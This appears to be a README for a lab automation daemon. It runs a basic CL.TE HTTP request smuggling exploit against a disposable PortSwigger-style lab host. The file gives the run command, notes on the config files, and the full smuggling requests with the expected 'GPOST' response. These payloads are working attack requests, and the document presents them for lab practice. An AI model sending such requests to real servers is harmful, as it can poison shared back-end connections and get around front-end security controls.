# Daemon lab: HTTP request smuggling, basic CL.TE

Two files:

- `config.lab.json` — transport: trusted tier, direct egress, scope locked to
  one lab host on port 443.
- `daemon.json` — one job, `smuggle-chain`, success marker
  `Unrecognized method GPOST`.

Run:

```bash
go run ./cmd/omnislashd -config examples/daemon/daemon.json -once
```

The daemon writes one JSON object per attempt to `lab-clte.jsonl` (gitignored)
and prints a summary. Exit code is 0 only when the job reached its marker.

## What the probe does

The lab front-end honours `Content-Length`; the back-end honours
`Transfer-Encoding: chunked`. The probe sends:

```http
POST / HTTP/1.1
Host: <lab>
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end forwards six bytes (`0\r\n\r\nG`). The back-end sees the zero
chunk, ends the body, and keeps `G` in its connection buffer. The probe then
opens a second connection (same pinned session, same egress) and sends:

```http
POST / HTTP/1.1
Host: <lab>
Content-Length: 0
```

The back-end prepends the leftover byte and parses `GPOST / HTTP/1.1`, so the
response is:

```http
HTTP/1.1 403 Forbidden

"Unrecognized method GPOST"
```

That is the lab objective. `SmuggleChainProbe` reports `smuggle_confirmed`
with high confidence and waits for `attempts` tries, because the front-end's
back-end pool may need a few attempts before the victim lands on the poisoned
socket.

## Replacing an expired instance

PortSwigger lab instances are disposable. If the host no longer responds,
start a fresh instance of the same lab and update:

- `allow_hosts` in `config.lab.json`;
- `target.addr` and `target.host` in `daemon.json`.

Only run this against your own lab instance.
